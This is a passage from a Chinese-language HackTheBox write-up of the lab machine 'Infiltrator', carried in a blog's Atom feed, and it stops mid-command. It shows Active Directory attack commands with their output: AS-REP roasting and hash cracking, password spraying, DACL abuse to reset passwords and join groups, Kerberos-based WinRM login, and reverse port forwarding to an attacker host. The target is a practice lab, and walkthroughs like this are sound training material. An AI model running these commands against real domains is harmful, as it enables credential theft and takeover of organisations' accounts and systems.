<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一语成谶</title>
  
  
  <link href="http://fermionorz.github.io/atom.xml" rel="self"/>
  
  <link href="http://fermionorz.github.io/"/>
  <updated>2024-11-18T12:30:51.167Z</updated>
  <id>http://fermionorz.github.io/</id>
  
  <author>
    <name>Fermionorz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Infiltrator</title>
    <link href="http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/"/>
    <id>http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/</id>
    <published>2024-11-13T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.167Z</updated>
    
    <content type="html"><![CDATA[<img src="/2024/11/13/HTB-Infiltrator/Infiltrator.png" class=""><h2 id="Recon-Enum"><a href="#Recon-Enum" class="headerlink" title="Recon &amp; Enum"></a>Recon &amp; Enum</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Infiltrator.htb</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 00:14:19Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Issuer: commonName=infiltrator-DC01-CA</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">| Not valid after:  2099-07-17T18:48:15</span><br><span class="line">| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span><br><span class="line">|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span><br><span class="line">| Issuer: commonName=dc01.infiltrator.htb</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-30T13:20:17</span><br><span class="line">| Not valid after:  2025-01-29T13:20:17</span><br><span class="line">| MD5:   be1d:a071:bf6d:fff0:20c0:6b23:8e7e:1763</span><br><span class="line">|_SHA-1: cbda:6e22:6ccf:b5e7:534c:b9f0:d9e7:c5d8:dab9:769e</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Domain_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: infiltrator.htb</span><br><span class="line">|   DNS_Computer_Name: dc01.infiltrator.htb</span><br><span class="line">|   DNS_Tree_Name: infiltrator.htb</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-11-14T00:17:00+00:00</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49723/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49736/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49877/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -d infiltrator.htb -o <span class="built_in">log</span>/dns.log -r infiltrator.htb</span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115101539960.png" class=""><h3 id="Web-Dir"><a href="#Web-Dir" class="headerlink" title="Web Dir"></a>Web Dir</h3><p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -o <span class="built_in">log</span>/web_dir.log -u http://infiltrator.htb/</span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115101554808.png" class=""><h3 id="Rpc"><a href="#Rpc" class="headerlink" title="Rpc"></a>Rpc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient infiltrator.htb -U <span class="string">&#x27;guest%&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115090601507.png" class=""><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://infiltrator.htb -s base </span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115084920917.png" class=""><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u guest -p &#x27;&#x27; --shares</span><br><span class="line">netexec smb infiltrator.htb -u guest -p &#x27;&#x27; --rid-brute 10000</span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115085852364.png" class=""><h2 id="Shell-as-M-Harris"><a href="#Shell-as-M-Harris" class="headerlink" title="Shell as M.Harris"></a>Shell as M.Harris</h2><img src="/2024/11/13/HTB-Infiltrator/image-20241115091817108.png" class=""><p>在 Web 页面中发现了团队成员，保存名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">David Anderson</span><br><span class="line">Olivia Martinez</span><br><span class="line">Kevin Turner</span><br><span class="line">Amanda Walker</span><br><span class="line">Marcus Harris</span><br><span class="line">Lauren Clark</span><br><span class="line">Ethan Rodriguez</span><br></pre></td></tr></table></figure><p>生成用户名组合，使用 kerbrute 枚举用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum --dc infiltrator.htb -d infiltrator.htb info/dic_user.list -o <span class="built_in">log</span>/kerbrute_username.log</span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       D.Anderson@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       O.Martinez@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       K.Turner@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       A.Walker@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       M.Harris@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       E.Rodriguez@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       L.Clark@infiltrator.htb</span><br><span class="line">2024/11/14 20:30:45 &gt;  Done! Tested 77 usernames (7 valid) <span class="keyword">in</span> 5.990 **seconds**</span><br></pre></td></tr></table></figure><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -no-pass -usersfile info/user.list infiltrator.htb/</span><br><span class="line">---</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] User D.Anderson doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User O.Martinez doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User K.Turner doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User A.Walker doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User M.Harris doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User E.Rodriguez doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$L</span>.Clark@INFILTRATOR.HTB:59de0be66010a9b1a6d556b9dc40655c<span class="variable">$c0a83a0c13c9d3c93845780d212b475ab9dfd03664fc96389a5b4a8a7b72b876309ec91711f79d884f88093518c1fd7c6c392ff1c56cc9b2b6f4b84902023c9fbc1ffb31d19fb65cbefebad093167c7ae1b7939e3b049f0efc404dfd0be057341484c578620f33ba407c998d20897e29bc56ec1c178b07c6bc6132c7b8aa4cc2001b6ccc0e994d78b9427f96c1329a078858eb8300170ad0bf6d5efcce373b3faa17939f71118d1832079db985a6c39904407c5d7e8706798bef1d2b5230a359fdba5303a11367b052af688630da080db393c07064a69fffd715a4c7bbe8533e3b48bfe5c344cb693f0cf79a505f744d8ef3</span></span><br></pre></td></tr></table></figure><ul><li>识别 Hash</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nth -f info/KRB_AS_REP.<span class="built_in">hash</span></span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used <span class="keyword">for</span> Windows Active Directory</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>Hashcat 爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 info/KRB_AS_REP.<span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">$krb5asrep$23<span class="variable">$L</span>.Clark@INFILTRATOR.HTB:65969ff15f18ac84bd58a6185f7ccd24<span class="variable">$93a0a81d05fc4e025b62fd665a350fdfbd750f4e7af34c2bd222ab727fd4a7fa5633c3dde88ed20df3ba406637168e9b45fcf9397784039601cac294c2ecd8cb6b24efec7ee83bece85a0a1a98f2852698284b8912e88fae047d9fdd9c88dfdbccf44c61eaa50427a5415260ebfe26f3db3c2a1efc996a2d92086589f515383854ae3502f0834e0da01ca5d20783d4a6ba3cd6019163df47c291bd99950e16deafa5bf5d7ccc39cfab61c5b71912b9aed41b259c708945e2b51c7d5fb5f7d0dae3cc955efa7ac9569ce98181e306ebc3834a1dd97817e9d6c03f4dfff165f526cc2b2a4b72c418b68cc6ccae4783cb73bd31</span>:WAT?watismypass!</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>拿到凭据 <code>L.Clark : WAT?watismypass!</code></p><h3 id="LDAP-Enum-user"><a href="#LDAP-Enum-user" class="headerlink" title="LDAP Enum user"></a>LDAP Enum user</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap infiltrator.htb -u <span class="string">&#x27;L.Clark&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115145558956.png" class=""><p>这里拿到了一个 <code>K.turner</code> 用户的备注，很像密码，先保存 <code>MessengerApp@Pass!</code></p><h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line">kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list <span class="string">&#x27;MessengerApp@Pass!&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115154323291.png" class=""><img src="/2024/11/13/HTB-Infiltrator/image-20241116191458803.png" class=""><p>两个用户使用的是这个密码，可以再枚举一下共享目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u info/user.list -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> --shares</span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115154520414.png" class=""><p>只有 L.Clark 有共享目录</p><h3 id="SMB-1"><a href="#SMB-1" class="headerlink" title="SMB"></a>SMB</h3><p>使用爬取模块，把共享目录文件信息下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u L.Clark -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> -M <span class="string">&quot;spider_plus&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115094907649.png" class=""><img src="/2024/11/13/HTB-Infiltrator/image-20241115095258652.png" class=""><p>从共享文件的名称和大小，没发现什么闪光点，这里也可以每个都查看一下。</p><h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm infiltrator.htb -u info/user.list -p info/pass.list</span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115154707007.png" class=""><p>WinRM 无法登录</p><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c all --zip -dc <span class="string">&#x27;infiltrator.htb&#x27;</span> -ns <span class="string">&#x27;10.10.11.31&#x27;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;L.Clark&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115101948892.png" class=""><p>查看高价值路径</p><img src="/2024/11/13/HTB-Infiltrator/image-20241115154907790.png" class=""><p>这个路径可以拿到 <code>M.Harris</code> 的权限，从而远程登录机器拿到 User Shell</p><p>首先修改 <code>E.Rodriguez</code> 的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 D.Anderson 票据</span></span><br><span class="line">impacket-getTGT <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;D.Anderson&#x27;</span>:<span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改 FullControl 权限</span></span><br><span class="line">KRB5CCNAME=D.Anderson.ccache /usr/share/doc/python3-impacket/examples/dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal <span class="string">&#x27;D.Anderson&#x27;</span> -target-dn <span class="string">&#x27;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB&#x27;</span> <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;D.Anderson&#x27;</span>:<span class="string">&#x27;WAT?watismypass!&#x27;</span> -dc-ip dc01.infiltrator.htb -k -no-pass</span><br><span class="line"></span><br><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;D.Anderson&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> <span class="built_in">set</span> password <span class="string">&#x27;E.Rodriguez&#x27;</span> <span class="string">&#x27;Admin@123&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115220410982.png" class=""><p>然后 <code>E.Rodriguez</code> 把自己添加到 <code>Chiefs Marketing</code> 组中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;E.Rodriguez&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> add groupMember <span class="string">&#x27;Chiefs Marketing&#x27;</span> <span class="string">&#x27;E.Rodriguez&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115221022787.png" class=""><p>再修改 <code>M.Harris</code> 的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;E.Rodriguez&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> <span class="built_in">set</span> password <span class="string">&#x27;M.Harris&#x27;</span> <span class="string">&#x27;Admin@123&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115221037702.png" class=""><p>然后可以使用 <code>M.Harris</code> 账户远程登录了</p><img src="/2024/11/13/HTB-Infiltrator/image-20241115225212345.png" class=""><p>直接连是不行的，需要使用 Kerberos 认证票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;M.Harris&#x27;</span>:<span class="string">&#x27;Admin@123&#x27;</span></span><br><span class="line">KRB5CCNAME=M.Harris.ccache evil-winrm -i <span class="string">&#x27;dc01.infiltrator.htb&#x27;</span> -u <span class="string">&#x27;M.Harris&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -r <span class="string">&#x27;infiltrator.htb&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115225250980.png" class=""><p>还是出现报错，同时也提示可以省略用户名和密码，这里的原因是 KDC 对于域名 <code>INFILTRATOR.HTB</code> 无法定位需要修改 <code>/etc/krb5.conf</code> 配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = INFILTRATOR.HTB</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line">    dns_lookup_kdc = false</span><br><span class="line">    forwardable = true</span><br><span class="line">[realms]</span><br><span class="line">    INFILTRATOR.HTB = &#123;</span><br><span class="line">        kdc = dc01.infiltrator.htb</span><br><span class="line">        admin_server = dc01.infiltrator.htb</span><br><span class="line">    &#125;</span><br><span class="line">[domain_realm]</span><br><span class="line">    .infiltrator.htb = INFILTRATOR.HTB</span><br><span class="line">    infiltrator.htb = INFILTRATOR.HTB</span><br></pre></td></tr></table></figure><p>再次尝试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=M.Harris.ccache evil-winrm -i <span class="string">&#x27;dc01.infiltrator.htb&#x27;</span> -r <span class="string">&#x27;infiltrator.htb&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2024/11/13/HTB-Infiltrator/image-20241115231220340.png" class=""><p>成功获取 Shell 权限，这里为了方便使用 Havoc 上线，然后使用 WinPEAS 枚举本地提权路径</p><h2 id="Shell-as-Administrator"><a href="#Shell-as-Administrator" class="headerlink" title="Shell as Administrator"></a>Shell as Administrator</h2><img src="/2024/11/13/HTB-Infiltrator/image-20241116122518554.png" class=""><p>在 WinPEAS 中可以看到 14*** 端口有一些服务，把 14*** 的端口转发到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell c.exe client -v 10.10.16.44:8080 R:0.0.0.0:14406:127.0.0.1:14406 R:0.0.0.0:14118:127.0.0.1:14118 R:0.0.0.0:14122:127.0.0.1:14122 R:0.0.0.0:14123:127.0.0.1:14123 R:0.0.0.0:14125:127.0.0.1:14125 R:0.0.0.0:14126:127.0.0.1:14126 R:0.0.0.0:14127:127.0.0.1:14127 R:0.0.0.0:14128:127.0.0.1:14128 R:0.0.0.0:14130:127.0.0.1:14130 </span><br></pre></td></tr></table></figure><p>扫描一下这些端口的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -T4 -sV -p 